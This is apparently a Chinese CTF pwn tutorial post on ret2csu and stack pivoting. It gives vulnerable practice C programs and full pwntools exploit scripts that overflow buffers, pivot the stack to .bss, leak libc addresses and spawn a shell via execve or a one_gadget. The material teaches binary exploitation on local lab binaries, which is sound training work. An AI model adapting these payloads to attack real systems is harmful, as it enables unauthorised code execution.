
[c6bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5k6%4u0W2k6h3c8Q4x3X3g2$3K9i4m8Q4x3V1j5J5x3o6t1I4i4K6u0r3x3e0u0Q4x3V1j5I4y4#2)9J5c8W2)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0f1^5x3q4)9J5y4f1f1%4i4K6t1#2b7f1k6Q4x3U0f1^5y4#2)9J5y4f1f1$3i4K6t1#2z5e0k6Q4x3U0f1^5y4#2)9J5y4f1f1%4i4K6t1#2b7f1u0Q4x3U0g2m8x3q4)9J5y4f1f1%4i4K6t1#2z5p5g2Q4x3U0g2m8z5g2)9J5y4f1f1$3i4K6t1#2z5e0S2Q4x3U0f1^5c8g2)9J5y4f1f1%4i4K6t1#2z5e0W2Q4x3U0g2n7c8q4y4@1j5h3y4C8i4K6u0V1L8h3W2Y4M7X3q4@1K9h3!0F1i4K6u0r3](https://bbs.kanxue.com/elink@a4cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5k6%4u0W2k6h3c8Q4x3X3g2$3K9i4m8Q4x3V1j5J5x3o6t1I4i4K6u0r3x3e0u0Q4x3V1j5I4y4#2)9J5c8W2)9J5y4f1f1@1i4K6t1#2b7U0S2Q4x3U0f1^5x3q4)9J5y4f1f1%4i4K6t1#2b7f1k6Q4x3U0f1^5y4#2)9J5y4f1f1$3i4K6t1#2z5e0k6Q4x3U0f1^5y4#2)9J5y4f1f1%4i4K6t1#2b7f1u0Q4x3U0g2m8x3q4)9J5y4f1f1%4i4K6t1#2z5p5g2Q4x3U0g2m8z5g2)9J5y4f1f1$3i4K6t1#2z5e0S2Q4x3U0f1^5c8g2)9J5y4f1f1%4i4K6t1#2z5e0W2Q4x3U0g2n7c8q4y4@1j5h3y4C8i4K6u0V1L8h3W2Y4M7X3q4@1K9h3!0F1i4K6u0r3)

# 中级rop ret2csu&栈迁移

tips: `'a'*offset+p64(fake_stack)+P64(leave)`

`csuinit`是一个二进制程序初始化的函数，视频有讲解，这里面有很多对寄存器的弹出，如果被我们利用到了就可以被我们传参去执行我们想要的函数，什么情况下要用`csu`呢，栈溢出存在但是溢出的非常小，不能构建一个基础`rop`，这时候就要用到栈迁移或者`ret2csu`

这里只讲`csu`和基础栈迁移，栈迁移的进阶玩法下一章再开

```python
def ret_csu(r12, r13, r14, r15, last):
    payload = offset * 'a'  #构造栈溢出的padding
    payload += p64(first_csu) + 'a'*8  #gadgets1的地址
    payload += p64(0) + p64(1)  #rbx=0, rbp=1
    payload += p64(r12)  #call调用的地址
    payload += p64(r13) + p64(r14) + p64(r15)  #三个参数的寄存器
    payload += p64(second_csu)  #gadgets2的地址
    payload += 'a'*56  #pop出的padding
    payload += p64(last)  #函数最后的返回地址
    return payload
```

对于`csu`模板的使用要分清情况
这里的话因为我们是要去调用`execve`而不是让他执行完毕
所以末尾的`'a'*56`可以删除
还有在`first_csu`后面也不能加`'a'*8`

## 题目

```c
#include<stdio.h>
char name[0x100];
void gift()
{
asm volatile ("syscall;\n\t");
}
void main()
{
char buf[0x20];
puts("name:");
read(0,name,0x100);
puts("passwd:");
read(0,buf,0x40);
}
```

## exp

```python
from pwn import *
csu_one=0x4005FA
csu_two=0x4005E0
syscall=0x40053B
leave=0x400597
bss=0x601060
r=process('./csu_mig')
r.recv()
def ret_csu(r12, r13, r14, r15, last):
    payload='/bin/sh\x00'
    payload += p64(csu_one)
    payload += p64(0) + p64(1)
    payload += p64(r12)
    payload += p64(r15) + p64(r14) + p64(r13)
    payload += p64(csu_two)
    payload += p64(last)
    return payload
ab=ret_csu(bss+72,0,0,bss,syscall)
r.send(ab)
r.recv()
payload='a'*0x20+p64(bss)+p64(leave)
r.send(payload.ljust(0x3b,'a'))
r.interactive()
```

## 额外练习典型csu

题目和exp

链接：[a2bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4z5s2c8d9c8U0j5J5L8h3u0k6c8U0k6T1j5g2)9#2k6X3S2n7c8o6g2$3g2#2k6m8](https://bbs.kanxue.com/elink@9e1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4z5s2c8d9c8U0j5J5L8h3u0k6c8U0k6T1j5g2)9#2k6X3S2n7c8o6g2$3g2#2k6m8)

提取码：4567

--来自百度网盘超级会员V2的分享

main函数

我们可以去用基础`rop`没问题但是这个例题只是为了更好的讲解`csu`的运用

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
char buf[32]; // [rsp+0h] [rbp-20h] BYREF
vul(0LL, 0LL, 0LL);
read(0, buf, 0x100uLL);
return 0;
}
```

没太多好讲的就是基本的模板题目，主要的是如果不用`onegadget`的话
拼接`system`的记得在`/bin/sh`后面加上`ret`进行栈对齐。栈对齐一直很玄学对我来说噗嗤。

## exp

```python
from pwn import *
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
sh = process("easycsu")
context.log_level = "DEBUG"
gadget1 = 0x00000000004011FE
gadget2 = 0x00000000004011E8
put_addr = 0x0000000000404018
libc_addr = 0x0000000000403ff0
start_addr = 0x0000000000401050
payload = (0x20 + 8) * 'a'
payload += p64(gadget1)
payload += 'a'*8
payload += p64(0)
payload += p64(1)
payload += p64(put_addr)
payload += p64(0x0000000000404018) + p64(0x0000000000404018) + p64(0x0000000000404018)
payload += p64(gadget2)
payload += 'a'*56
payload += p64(start_addr)
sh.recv()
sh.send(payload)
real_addr = u64(sh.recv(6).ljust(8,'\x00'))
print hex(real_addr)
addr_base = real_addr - libc.sym['puts']
print(hex(libc.sym['puts']))
system_addr = addr_base + libc.sym['system']
binsh_addr = addr_base + 0x1b3e1a
one=0x4f3d5+addr_base
pop_addr = 0x000000000040120b
sh.recv()
payload=(0x20 + 8) * 'a' + p64(one)
sh.send(payload)
sh.sendline('cat flag')
sh.interactive()
```

# Tips

我的建议是如果有空的话，自己仿照我程序写一些题目自己来做，可以发挥自己探索能力，比如自己结合下第一章的泄露`canary`配上基础`rop`自己玩玩，或者说试试看基础栈迁移配上基础`rop`试试看都可以的，不要局限于我这简陋的教程

下面就举个例子我就不提供`exp`了想玩的朋友可以尝试下，自己编译自己写

解题思路就是先在`pwnme`上布局基础`rop`泄露`libc`然后栈迁移过去执行，然后再来一次就是`getshell`，秒杀题。

## 基础栈迁移配上基础rop

```c
#include<stdio.h>
char pwnme[0x100];
void main(){
char buf[0x20];
puts("hello!");
read(0,pwnme,0x100);
puts("wuhu");
read(0,buf,0x30);
}
```

编译指令

```bash
gcc -fno-stack-protector -no-pie -o lowrop lowrop.c
```

## syscall系统调用表
